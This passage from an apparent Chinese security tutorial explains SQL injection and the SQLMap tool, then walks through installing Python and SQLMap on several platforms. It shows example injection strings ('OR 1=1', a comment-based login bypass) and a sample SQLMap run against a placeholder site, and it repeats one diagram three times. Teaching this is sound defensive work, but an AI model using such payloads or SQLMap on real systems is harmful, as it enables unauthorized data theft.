正常情况下，这没问题。但如果顾客在纸条上写：
```
"给我商品编号为1的商品，或者直接给我所有商品"
```

如果不检查这张纸条，你可能执行：
```sql
SELECT * FROM products WHERE id = 1 OR 1=1
```

因为`1=1`总是成立，这条语句会返回所有商品！

这就是**SQL注入**——攻击者通过输入恶意内容，改变原本的SQL语句，实现未授权的数据访问。

### SQLMap 是什么？

**SQLMap** 是一个自动化的SQL注入检测和利用工具。它就像一个"智能黑客"，能够：
- 自动检测是否存在SQL注入
- 自动识别数据库类型
- 自动提取数据库数据
- 自动执行各种高级攻击

简单来说，SQLMap让SQL注入变得自动化，你只需要告诉它目标URL，它就会帮你完成剩下的工作。

### SQLMap 能做什么？

| 功能 | 说明 | 通俗理解 |
|------|------|----------|
| 检测注入点 | 自动检测是否存在注入 | 找门 |
| 指纹识别 | 识别数据库类型 | 认门 |
| 数据提取 | 提取数据库数据 | 进门搬东西 |
| 密码破解 | 破解数据库密码哈希 | 撬保险柜 |
| 文件读写 | 读写服务器文件 | 翻文件柜 |
| 命令执行 | 执行系统命令 | 控制大楼 |
| 权限提升 | 获取更高权限 | 拿钥匙 |

### SQL注入原理详解

#### 基础注入原理

假设一个简单的查询：
```sql
SELECT * FROM users WHERE username = '$input' AND password = '$pass'
```

正常输入`admin`，语句变成：
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'xxx'
```

注入输入`admin'--`，语句变成：
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'xxx'
```

`--`是注释符号，后面的内容被忽略，密码验证被绕过！

#### 注入类型分类

| 类型 | 说明 | 检测难度 |
|------|------|----------|
| 内联注入 | 注入内容直接嵌入SQL语句 | 简单 |
| 终止式注入 | 注入内容终止原语句并添加新语句 | 简单 |
| 联合注入 | 使用UNION合并查询结果 | 中等 |
| 堆叠注入 | 执行多条SQL语句 | 困难 |
| 布尔盲注 | 通过页面变化判断结果 | 困难 |
| 时间盲注 | 通过响应时间判断结果 | 很困难 |

---

## 4.2 Python 环境安装与配置

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss04" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss04g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s04dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss04g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss04dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-4 三平台 SQLMap 安装路径图（3 大操作系统 × 3 种方式）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">推荐：Kali 自带 = 开箱即用；Windows 下 ZIP 解压最简；Docker 适合隔离环境</text>  <rect x="40" y="110" width="230" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="110" width="230" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="155.0" y="130" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Windows 10/11</text>  <text x="155.0" y="160" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="230" width="230" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="230" width="230" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="155.0" y="250" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali/Ubuntu/Debian</text>  <text x="155.0" y="280" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="350" width="230" height="92" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="350" width="230" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="155.0" y="370" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">macOS (Intel/M1/M2/M3)</text>  <text x="155.0" y="400" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="320" y="105" width="360" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="105" width="360" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="500.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">方式 ① ZIP 下载 (最简)</text>  <text x="500.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">1) sqlmap.org 下载 zip
2) 解压 C:\sqlmap</text>  <text x="500.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
3) python sqlmap.py -hh</text>  <text x="500.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="320" y="225" width="360" height="92" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="225" width="360" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="500.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">方式 ② Git Clone (更新方便)</text>  <text x="500.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">git clone --depth 1
 https://github.</text>  <text x="500.0" y="291" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">com/sqlmapproject/sqlmap
 cd sqlmap </text>  <text x="500.0" y="307" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; python sqlmap.py -hh</text>  <rect x="320" y="345" width="360" height="92" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="345" width="360" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="500.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">方式 ③ Docker (隔离最干净)</text>  <text x="500.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">docker pull paoloo/sqlmap
docker run</text>  <text x="500.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> -it --rm paoloo/sqlmap
 -u http://t</text>  <text x="500.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">arget.com/?id=1 --batch</text>  <rect x="720" y="105" width="320" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="105" width="320" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="880.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali 直接用（预装）</text>  <text x="880.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">which sqlmap
sqlmap -hh / sqlmap --version
2024 最新版 daily 更新</text>  <rect x="720" y="225" width="320" height="92" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="225" width="320" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="880.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Python 三平台统一安装</text>  <text x="880.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Windows: python.org 下载 3.12
Ubuntu: apt install -y python3
macOS: brew install python3</text>  <rect x="720" y="345" width="320" height="92" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="345" width="320" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="880.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">环境验证 (任何平台)</text>  <text x="880.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">python3 sqlmap.py --version
sqlmap -hh (Kali 全局命令)
返回版本号=OK 不报错</text>  <defs><marker id="a270156320156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="156" x2="320" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270156320156)"/>  <defs><marker id="a680156720156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="156" x2="720" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680156720156)"/>  <defs><marker id="a270276320276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="276" x2="320" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270276320276)"/>  <defs><marker id="a680276720276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="276" x2="720" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680276720276)"/>  <defs><marker id="a270396320396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="396" x2="320" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270396320396)"/>  <defs><marker id="a680396720396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="396" x2="720" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680396720396)"/>  <rect x="30" y="500" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="516" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">Python 版本要求：3.7+（3.11/3.12 最佳性能）；不用单独 pip install（SQLMap 0 第三方依赖）</text>
</svg>

### 为什么需要Python？

SQLMap是用Python编写的，需要Python环境才能运行。

### Windows 安装 Python

**步骤1：下载Python**

1. 访问官网：https://www.python.org/downloads/
2. 下载Python 3.x版本（推荐3.8-3.11）

**步骤2：安装Python**

1. 双击安装包
2. **重要**：勾选"Add Python to PATH"
3. 点击"Install Now"安装

**步骤3：验证安装**

打开命令提示符：
```batch
python --version
```

如果显示版本号，说明安装成功。

### Linux 安装 Python

Ubuntu/Debian通常已预装Python：

```bash
python3 --version
```

如果没有：
```bash
sudo apt install python3 python3-pip
```

### macOS 安装 Python

使用Homebrew：
```bash
brew install python3
```

---

## 4.3 Windows 系统安装教程

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss04" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss04g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s04dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss04g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss04dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-4 三平台 SQLMap 安装路径图（3 大操作系统 × 3 种方式）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">推荐：Kali 自带 = 开箱即用；Windows 下 ZIP 解压最简；Docker 适合隔离环境</text>  <rect x="40" y="110" width="230" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="110" width="230" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="155.0" y="130" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Windows 10/11</text>  <text x="155.0" y="160" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="230" width="230" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="230" width="230" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="155.0" y="250" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali/Ubuntu/Debian</text>  <text x="155.0" y="280" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="350" width="230" height="92" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="350" width="230" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="155.0" y="370" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">macOS (Intel/M1/M2/M3)</text>  <text x="155.0" y="400" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="320" y="105" width="360" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="105" width="360" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="500.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">方式 ① ZIP 下载 (最简)</text>  <text x="500.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">1) sqlmap.org 下载 zip
2) 解压 C:\sqlmap</text>  <text x="500.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
3) python sqlmap.py -hh</text>  <text x="500.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="320" y="225" width="360" height="92" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="225" width="360" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="500.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">方式 ② Git Clone (更新方便)</text>  <text x="500.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">git clone --depth 1
 https://github.</text>  <text x="500.0" y="291" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">com/sqlmapproject/sqlmap
 cd sqlmap </text>  <text x="500.0" y="307" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; python sqlmap.py -hh</text>  <rect x="320" y="345" width="360" height="92" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="345" width="360" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="500.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">方式 ③ Docker (隔离最干净)</text>  <text x="500.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">docker pull paoloo/sqlmap
docker run</text>  <text x="500.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> -it --rm paoloo/sqlmap
 -u http://t</text>  <text x="500.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">arget.com/?id=1 --batch</text>  <rect x="720" y="105" width="320" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="105" width="320" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="880.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali 直接用（预装）</text>  <text x="880.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">which sqlmap
sqlmap -hh / sqlmap --version
2024 最新版 daily 更新</text>  <rect x="720" y="225" width="320" height="92" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="225" width="320" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="880.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Python 三平台统一安装</text>  <text x="880.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Windows: python.org 下载 3.12
Ubuntu: apt install -y python3
macOS: brew install python3</text>  <rect x="720" y="345" width="320" height="92" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="345" width="320" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="880.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">环境验证 (任何平台)</text>  <text x="880.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">python3 sqlmap.py --version
sqlmap -hh (Kali 全局命令)
返回版本号=OK 不报错</text>  <defs><marker id="a270156320156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="156" x2="320" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270156320156)"/>  <defs><marker id="a680156720156" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="156" x2="720" y2="156" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680156720156)"/>  <defs><marker id="a270276320276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="276" x2="320" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270276320276)"/>  <defs><marker id="a680276720276" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="276" x2="720" y2="276" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680276720276)"/>  <defs><marker id="a270396320396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="270" y1="396" x2="320" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a270396320396)"/>  <defs><marker id="a680396720396" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker></defs>  <line x1="680" y1="396" x2="720" y2="396" stroke="#60a5fa" stroke-width="2" marker-end="url(#a680396720396)"/>  <rect x="30" y="500" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="516" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">Python 版本要求：3.7+（3.11/3.12 最佳性能）；不用单独 pip install（SQLMap 0 第三方依赖）</text>
</svg>

### 方式一：下载ZIP包（推荐）

**步骤1：下载SQLMap**

1. 访问官网：https://sqlmap.org/
2. 下载最新版本的ZIP包
3. 或访问GitHub：https://github.com/sqlmapproject/sqlmap

**步骤2：解压文件**

将ZIP文件解压到固定目录（如`D:\sqlmap`）

**步骤3：运行SQLMap**

打开命令提示符，进入SQLMap目录：
```batch
cd D:\sqlmap
python sqlmap.py --version
```

### 方式二：Git克隆

```batch
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git D:\sqlmap
```

### 方式三：使用Docker

```bash
docker pull sqlmap/sqlmap
docker run -it sqlmap/sqlmap -h
```

---

## 4.4 Linux 系统安装教程

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss04" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss04g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s04dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss04g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss04dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-4 三平台 SQLMap 安装路径图（3 大操作系统 × 3 种方式）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">推荐：Kali 自带 = 开箱即用；Windows 下 ZIP 解压最简；Docker 适合隔离环境</text>  <rect x="40" y="110" width="230" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="110" width="230" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="155.0" y="130" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Windows 10/11</text>  <text x="155.0" y="160" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="230" width="230" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="230" width="230" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="155.0" y="250" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali/Ubuntu/Debian</text>  <text x="155.0" y="280" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="40" y="350" width="230" height="92" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="40" y="350" width="230" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="155.0" y="370" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">macOS (Intel/M1/M2/M3)</text>  <text x="155.0" y="400" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Python 3.7+ 必装
（SQLMap 纯 Python 写的）</text>  <rect x="320" y="105" width="360" height="92" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="105" width="360" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="500.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">方式 ① ZIP 下载 (最简)</text>  <text x="500.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">1) sqlmap.org 下载 zip
2) 解压 C:\sqlmap</text>  <text x="500.0" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">
3) python sqlmap.py -hh</text>  <text x="500.0" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="320" y="225" width="360" height="92" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="225" width="360" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="500.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">方式 ② Git Clone (更新方便)</text>  <text x="500.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">git clone --depth 1
 https://github.</text>  <text x="500.0" y="291" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">com/sqlmapproject/sqlmap
 cd sqlmap </text>  <text x="500.0" y="307" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; python sqlmap.py -hh</text>  <rect x="320" y="345" width="360" height="92" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="320" y="345" width="360" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="500.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">方式 ③ Docker (隔离最干净)</text>  <text x="500.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">docker pull paoloo/sqlmap
docker run</text>  <text x="500.0" y="411" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> -it --rm paoloo/sqlmap
 -u http://t</text>  <text x="500.0" y="427" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">arget.com/?id=1 --batch</text>  <rect x="720" y="105" width="320" height="92" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="105" width="320" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="880.0" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Kali 直接用（预装）</text>  <text x="880.0" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">which sqlmap
sqlmap -hh / sqlmap --version
2024 最新版 daily 更新</text>  <rect x="720" y="225" width="320" height="92" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="225" width="320" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="880.0" y="245" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Python 三平台统一安装</text>  <text x="880.0" y="275" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Windows: python.org 下载 3.12
Ubuntu: apt install -y python3
macOS: brew install python3</text>  <rect x="720" y="345" width="320" height="92" rx="10" fill="#0f172a" stroke="#ec4899" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="720" y="345" width="320" height="30" rx="10" fill="#ec4899" opacity="0.20"/>  <text x="880.0" y="365" text-anchor="middle" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">环境验证 (任何平台)</text>  <text x="880.0" y="395" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">python3 sqlmap.py --version
sqlmap -hh (Kali 全局命令)
